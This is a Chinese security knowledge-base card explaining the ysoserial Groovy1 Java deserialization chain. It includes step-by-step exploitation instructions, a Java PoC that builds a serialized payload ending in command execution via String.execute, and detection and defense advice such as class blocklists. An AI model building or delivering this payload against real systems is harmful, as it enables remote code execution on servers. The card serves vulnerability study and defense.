---
id: web-java-deser-groovy1-annotationinvocationhandler-convertedclosure-methodclosure
title: ysoserial Groovy1 原生反序列化链：AnnotationInvocationHandler.readObject 触发 Map 代理，ConvertedClosure→MethodClosure→String.execute 命令执行
type: scenario
domain: web
path: web/java/deserialization
technique: groovy1-annotationinvocationhandler-convertedclosure-methodclosure
tags:
- java
- deserialization
- gadget
- groovy
- methodclosure
- convertedclosure
- annotationinvocationhandler
- rce
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-12'
updated: '2026-11-12'
verification:
  verified_by: verifier-V593
  verified_at: '2026-11-12T15:38:14+08:00'
  notes: 已对照原文 Groovy 反序列化节（含图19/20/21）核对：MethodClosure.doCall→InvokerHelper.invokeMethod(owner,method,args)（图19）、Closure.call→getMetaClass().invokeMethod(this,"doCall",args)（图20）、ConversionHandler.invoke→checkMethod 为假时 invokeCustom（图21）、ConvertedClosure.invokeCustom 的 methodName==null||equals(method.getName()) 时 call、AnnotationInvocationHandler.readObject 遍历 memberValues.entrySet() 触发 Map 代理、exp 的 MethodClosure("calc","execute")+ConvertedClosure(closure,"entrySet")+Proxy Map+AnnotationInvocationHandler(Target.class,map) 序列化触发，均与原文一致，PoC 与原文 exp 等价（原文同在进程内 serialize/unserialize 验证）。原文未标注 Groovy 组件版本，未设 affected_versions；JDK 前提卡片已注明 JDK8 可构造、JDK9+ 需 --add-opens，并说明原文未给版本范围。去重：dedup recommendation=new，top 候选 CC1 TransformedMap/LazyMap、Spring1/2、Hessian GString、JRMP 均非同一链；与 Hessian Groovy GString 卡入口不同（原生反序列化 readObject/entrySet vs Hessian GString.hashCode），不重复；全库无其他 ConvertedClosure+AnnotationInvocationHandler 原生链卡。未验证点：未在本机执行 PoC，原文无命令行回显截图（仅进程内触发验证）。
url: /docs/web/java/deserialization/web-java-deser-groovy1-annotationinvocationhandler-convertedclosure-methodclosure/
draft: false
kb_aliases:
- Groovy1 链
- ConvertedClosure 反序列化
- MethodClosure doCall
- ProcessGroovyMethods execute
- AnnotationInvocationHandler entrySet 代理
- Groovy 原生反序列化
---

## 一句话结论

classpath 含 Groovy 且存在 Java 原生反序列化入口时，`AnnotationInvocationHandler.readObject()` 会对 `memberValues` 调用 `entrySet()`；把 `memberValues` 换成由 `ConvertedClosure` 处理的 `Map` 动态代理，即触发 `ConversionHandler.invoke → ConvertedClosure.invokeCustom → Closure.call → MethodClosure.doCall → InvokerHelper.invokeMethod`，最终执行 `"calc".execute()` 等价命令（ysoserial Groovy1）。

## 原理

- **入口**：`sun.reflect.annotation.AnnotationInvocationHandler` 的 `readObject` 会遍历 `memberValues.entrySet()` 并把每个 entry 转成字符串；`memberValues` 是攻击者可控的 `Map`。用 `Proxy.newProxyInstance(..., new Class[]{Map.class}, convertedClosure)` 让 `memberValues` 成为动态代理，`entrySet()` 调用即进入其 `InvocationHandler`。
- **ConvertedClosure → Closure 桥**：`ConvertedClosure extends ConversionHandler implements Serializable`，构造时传 `(Closure closure, String methodName)`。`ConversionHandler.invoke` 对非 `Object` 方法走 `invokeCustom(proxy, method, args)`；`ConvertedClosure.invokeCustom` 在 `methodName == null || methodName.equals(method.getName())` 时执行 `((Closure)getDelegate()).call(args)`。把 `methodName` 设为 `"entrySet"`、delegate 设为 `MethodClosure`，就把任意 `Map` 代理方法转成 Closure 调用。
- **MethodClosure 执行**：`MethodClosure(Object owner, String method)` 的 `doCall(args)` 调用 `InvokerHelper.invokeMethod(this.getOwner(), this.method, arguments)`——对 `owner="calc"`、`method="execute"` 即 Groovy 的 `String.execute()` 扩展，内部走 `ProcessGroovyMethods.execute` → `Runtime.exec`，执行命令。`Closure.call(args)` 通过元类转调 `doCall`。
- **为什么成立**：整条链不依赖 `TemplatesImpl` 或 JNDI，只依赖 Groovy 自带类与 JDK 动态代理；反序列化时不需要任何 getter/setter，入口完全由 `AnnotationInvocationHandler.readObject` 的 `entrySet()` 调用驱动。
- **JDK 前提**：`AnnotationInvocationHandler` 是 JDK 内部类，JDK 8 可直接反射构造（构造器 `(Class, Map)`）；JDK 9+ 受模块封装/`--add-opens` 限制。本文未给出 JDK 版本范围（文章示例为 JDK 8 风格代码），实际利用以目标 JDK 可访问该内部类为准。

## 触发条件

- 目标存在 Java 原生反序列化入口（`ObjectInputStream.readObject` 等），且黑名单未拦截 `sun.reflect.annotation.AnnotationInvocationHandler`、`org.codehaus.groovy.runtime.ConvertedClosure`/`MethodClosure`。
- classpath 含 Groovy（`org.codehaus.groovy`，`ConvertedClosure`/`MethodClosure`/`InvokerHelper` 可用）。
- JDK 允许构造 `AnnotationInvocationHandler`（JDK 8 默认；高版本需模块开放或换其它动态代理入口）。
- 命令执行不受 `Runtime.exec`/`ProcessGroovyMethods` 类名/行为黑名单限制。

## 利用步骤

1. 构造 `MethodClosure("calc", "execute")`（实际攻击替换为 `"cmd /c ..."`/`bash -c ...` 等命令串）。
2. 用 `ConvertedClosure(methodClosure, "entrySet")` 作为 `InvocationHandler`，`Proxy.newProxyInstance` 创建 `Map` 代理。
3. 反射构造 `AnnotationInvocationHandler(Target.class, mapProxy)`，得到可序列化对象。
4. Java 原生序列化后投递到目标，`readObject` 触发 `entrySet()` → `ConversionHandler.invoke` → `ConvertedClosure.invokeCustom` → `Closure.call` → `MethodClosure.doCall` → `InvokerHelper.invokeMethod` → `"calc".execute()`。
5. 若命令含空格/管道，把整个命令串交给 `execute`（Groovy 的 `String.execute()` 支持 shell 语义）或改用 `["cmd","/c","..."]` 列表形式。

## PoC

原文 exp（精简，未在本机执行）：

```java
MethodClosure methodClosure = new MethodClosure("calc", "execute");
ConvertedClosure closure = new ConvertedClosure(methodClosure, "entrySet");
Class<?> aih = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
Constructor<?> ctor = aih.getDeclaredConstructor(Class.class, Map.class);
ctor.setAccessible(true);
Map handler = (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),
        new Class[]{Map.class}, closure);
Object obj = ctor.newInstance(Target.class, handler);
// 原生序列化 obj，在目标端 readObject 触发
```

## 变体与关联

- 变体：`methodName` 换成其它 `Map` 接口方法（如 `values`/`keySet`）以适配不同入口；`MethodClosure` 的 owner/method 可调用任意无参/单参方法，做二次反序列化或 JNDI 跳板；Hessian 场景下可用 GString 链达到同类效果。
- 关联卡片：[[web-java-deser-hessian-groovy-gstring-chain]]（Hessian 的 GString hashCode→Closure.call 变体，及其 ContinuationDirContext/ConvertedClosure 分支）、[[web-java-deser-rhino1-nativeerror-tostring-memberbox-invoke]]（同属"动态语言运行时被反序列化滥用"的 Rhino 链）。

## 检测与防御

- **黑白名单**：反序列化入口白名单化，拒绝 `org.codehaus.groovy.runtime.ConvertedClosure`、`MethodClosure`、`InvokerHelper`、`ProcessGroovyMethods`、`sun.reflect.annotation.AnnotationInvocationHandler`；JEP 290 对象输入过滤器覆盖内部类。
- **依赖治理**：业务不需要 Groovy 时移除依赖；需要时限制 Groovy 脚本/闭包反序列化能力。
- **检测**：反序列化流量/日志中出现 Groovy runtime 类名；进程创建 `calc`/`cmd`/`bash` 等子进程且父进程为 Java 服务；`ProcessGroovyMethods.execute`/`Runtime.exec` 调用栈异常。
